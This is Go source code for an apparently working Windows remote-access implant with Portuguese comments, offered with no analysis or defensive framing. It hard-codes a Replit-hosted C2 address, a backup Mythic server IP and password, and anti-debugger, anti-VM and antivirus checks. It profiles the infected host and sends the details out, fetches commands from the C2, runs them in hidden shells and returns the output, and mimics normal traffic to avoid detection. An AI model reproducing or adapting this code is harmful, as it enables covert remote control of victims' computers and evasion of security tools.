package main

import (
        "bytes"
        "crypto/tls"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io"
        "math/rand"
        "net/http"
        "os"
        "os/exec"
        "runtime"
        "strings"
        "syscall"
        "time"
        "unsafe"
)

const (
        // Configuração para o Flask C2 local
        flaskURL = "https://6c1e72f2-9688-4fda-b9c5-e7a7de8f8a5f-00-3r21xb6bm5ixn.kirk.replit.dev"
        // Backup para Mythic se necessário
        mythicURL = "https://37.27.249.191:7443"
        mythicPwd = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
        userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        mutexName = "Global\\WinServiceHost32"
)

var (
        kernel32 = syscall.NewLazyDLL("kernel32.dll")
        user32   = syscall.NewLazyDLL("user32.dll")
        
        procIsDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")
        procGetCursorPos      = user32.NewProc("GetCursorPos")
        procCreateMutexW      = kernel32.NewProc("CreateMutexW")
        procGetSystemMetrics  = user32.NewProc("GetSystemMetrics")
)

type FlaskStatus struct {
        Hostname string `json:"hostname"`
        Username string `json:"username"`
        IP       string `json:"ip"`
        OS       string `json:"os"`
        Time     int64  `json:"time"`
}

type FlaskCommand struct {
        Hostname string `json:"hostname"`
        Command  string `json:"command"`
        Output   string `json:"output"`
        Time     int64  `json:"time"`
}

type FlaskHeartbeat struct {
        Hostname string `json:"hostname"`
        Time     int64  `json:"time"`
}

type MousePoint struct {
        X, Y int32
}

func DetectHostileEnvironment() bool {
        if runtime.GOOS != "windows" {
                return false
        }
        
        ret, _, _ := procIsDebuggerPresent.Call()
        if ret != 0 {
                return true
        }
        
        hostileProcesses := []string{
                "ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
                "regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
                "sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
                "avp", "avast", "kaspersky", "norton", "mcafee", "malwarebytes", "defender",
        }
        
        for _, proc := range hostileProcesses {
                cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
                if output, err := cmd.Output(); err == nil {
                        if strings.Contains(strings.ToLower(string(output)), proc) {
                                return true
                        }
                }
        }
        
        cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        if output, err := cmd.Output(); err == nil {
                manufacturer := strings.ToLower(string(output))
                vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation", "innotek"}
                for _, vm := range vmStrings {
                        if strings.Contains(manufacturer, vm) {
                                return true
                        }
                }
        }
        
        width, _, _ := procGetSystemMetrics.Call(0)
        height, _, _ := procGetSystemMetrics.Call(1)
        if width < 1024 || height < 768 {
                return true
        }
        
        if runtime.NumCPU() < 2 {
                return true
        }
        
        return false
}

func VerifyUserActivity() bool {
        var pos1, pos2, pos3 MousePoint
        
        procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
        time.Sleep(200 * time.Millisecond)
        procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
        time.Sleep(200 * time.Millisecond)
        procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos3)))
        
        if pos1.X == pos2.X && pos1.Y == pos2.Y && pos2.X == pos3.X && pos2.Y == pos3.Y {
                time.Sleep(3 * time.Second)
                var pos4 MousePoint
                procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos4)))
                return pos3.X != pos4.X || pos3.Y != pos4.Y
        }
        
        return true
}

func IsBusinessHours() bool {
        now := time.Now()
        hour := now.Hour()
        weekday := now.Weekday()
        
        if weekday == time.Saturday || weekday == time.Sunday {
                return false
        }
        
        return hour >= 9 && hour <= 17
}

func RegisterWithFlask() error {
        hostname, _ := os.Hostname()
        
        status := FlaskStatus{
                Hostname: hostname,
                Username: os.Getenv("USERNAME"),
                IP:       "127.0.0.1",
                OS:       runtime.GOOS + " " + runtime.GOARCH,
                Time:     time.Now().Unix(),
        }
        
        jsonData, err := json.Marshal(status)
        if err != nil {
                return err
        }
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("POST", flaskURL+"/report_status", bytes.NewBuffer(jsonData))
        if err != nil {
                return err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", userAgent)
        
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        
        return nil
}

func GetFlaskCommands() (string, error) {
        hostname, _ := os.Hostname()
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("GET", flaskURL+"/get_command?hostname="+hostname, nil)
        if err != nil {
                return "", err
        }
        
        req.Header.Set("User-Agent", userAgent)
        
        resp, err := client.Do(req)
        if err != nil {
                return "", err
        }
        defer resp.Body.Close()
        
        body, err := io.ReadAll(resp.Body)
        if err != nil {
                return "", err
        }
        
        var result map[string]interface{}
        json.Unmarshal(body, &result)
        
        if cmd, ok := result["command"].(string); ok && cmd != "" {
                return cmd, nil
        }
        
        return "", nil
}

func ExecuteCommand(command string) string {
        var cmd *exec.Cmd
        
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/c", command)
                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        } else {
                cmd = exec.Command("sh", "-c", command)
        }
        
        output, err := cmd.Output()
        if err != nil {
                return fmt.Sprintf("Error: %s", err.Error())
        }
        
        return string(output)
}

func SendFlaskOutput(command, output string) error {
        hostname, _ := os.Hostname()
        
        cmdOutput := FlaskCommand{
                Hostname: hostname,
                Command:  command,
                Output:   output,
                Time:     time.Now().Unix(),
        }
        
        jsonData, err := json.Marshal(cmdOutput)
        if err != nil {
                return err
        }
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("POST", flaskURL+"/report_output", bytes.NewBuffer(jsonData))
        if err != nil {
                return err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", userAgent)
        
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        
        return nil
}

func SendHeartbeat() error {
        hostname, _ := os.Hostname()
        
        heartbeat := FlaskHeartbeat{
                Hostname: hostname,
                Time:     time.Now().Unix(),
        }
        
        jsonData, err := json.Marshal(heartbeat)
        if err != nil {
                return err
        }
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("POST", flaskURL+"/heartbeat", bytes.NewBuffer(jsonData))
        if err != nil {
                return err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", userAgent)
        
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        
        return nil
}

func MaintainLegitimacy() {
        go func() {
                rand.Seed(time.Now().UnixNano())
                
                for {
                        sleepTime := time.Duration(300+rand.Intn(600)) * time.Second
                        time.Sleep(sleepTime)
                        
                        activities := []func(){
                                func() {
                                        cmd := exec.Command("nslookup", "microsoft.com")
                                        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
                                        cmd.Run()
                                },
                                func() {
                                        cmd := exec.Command("ping", "-n", "1", "8.8.8.8")
                                        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
                                        cmd.Run()
                                },
                                func() {
                                        cmd := exec.Command("ipconfig", "/all")
                                        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
                                        cmd.Run()
                                },
                        }
                        
                        if len(activities) > 0 {
                                activities[rand.Intn(len(activities))]()
                        }
                }
        }()
}

func main() {
        if DetectHostileEnvironment() {
                os.Exit(0)
        }
        
        if !VerifyUserActivity() {
                time.Sleep(15 * time.Second)
                if !VerifyUserActivity() {
                        os.Exit(0)
                }
        }
        
        if !IsBusinessHours() {
                now := time.Now()
                nextBusiness := now
                
                for nextBusiness.Weekday() == time.Saturday || 
                        nextBusiness.Weekday() == time.Sunday || 
                        nextBusiness.Hour() < 9 || 
                        nextBusiness.Hour() >= 17 {
                        nextBusiness = nextBusiness.Add(1 * time.Hour)
                }
                
                time.Sleep(nextBusiness.Sub(now))
        }
        
        mutexNamePtr, _ := syscall.UTF16PtrFromString(mutexName)
        mutex, _, _ := procCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(mutexNamePtr)))
        if mutex == 0 {
                os.Exit(0)
        }
        
        MaintainLegitimacy()
        
        time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
        
        err := RegisterWithFlask()
        if err != nil {
                time.Sleep(time.Duration(60+rand.Intn(120)) * time.Second)
                os.Exit(0)
        }
        
        rand.Seed(time.Now().UnixNano())
        heartbeatCounter := 0
        
        for {
                command, err := GetFlaskCommands()
                if err == nil && command != "" {
                        output := ExecuteCommand(command)
                        SendFlaskOutput(command, output)
                }
                
                heartbeatCounter++
                if heartbeatCounter >= 10 {
                        SendHeartbeat()
                        heartbeatCounter = 0
                }
                
                now := time.Now()
                var jitter time.Duration
                
                if now.Hour() >= 9 && now.Hour() <= 17 {
                        jitter = time.Duration(3+rand.Intn(7)) * time.Second
                } else {
                        jitter = time.Duration(10+rand.Intn(20)) * time.Second
                }
                
                time.Sleep(jitter)
        }
}